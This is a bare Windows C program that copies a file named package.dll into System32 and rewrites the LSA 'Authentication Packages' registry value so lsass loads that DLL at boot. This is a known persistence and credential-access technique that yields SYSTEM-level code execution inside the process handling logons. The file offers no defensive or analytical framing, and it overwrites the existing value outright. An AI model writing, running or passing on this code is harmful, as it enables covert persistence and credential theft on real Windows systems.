#include <windows.h>
#include <stdio.h>

int main() {
    const char* srcPath = "package.dll";
    const char* dstPath = "C:\\Windows\\System32\\package.dll";

    if (!CopyFileA(srcPath, dstPath, FALSE)) {
        printf("[-] Failed to copy file to System32. Error: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] Successfully copied DLL to System32.\n");
    }

    HKEY hKey;
    const char* regPath = "SYSTEM\\CurrentControlSet\\Control\\Lsa";
    const char* valueName = "Authentication Packages";

    char multiSz[] = "msv1_0\0package.dll\0\0";
    DWORD dataSize = sizeof(multiSz);

    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key. Error: %ld\n", result);
        return 1;
    }

    result = RegSetValueExA(hKey, valueName, 0, REG_MULTI_SZ, (const BYTE*)multiSz, dataSize);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to set registry value. Error: %ld\n", result);
        RegCloseKey(hKey);
        return 1;
    }

    printf("[+] Registry value updated successfully.\n");
    RegCloseKey(hKey);

    return 0;
}
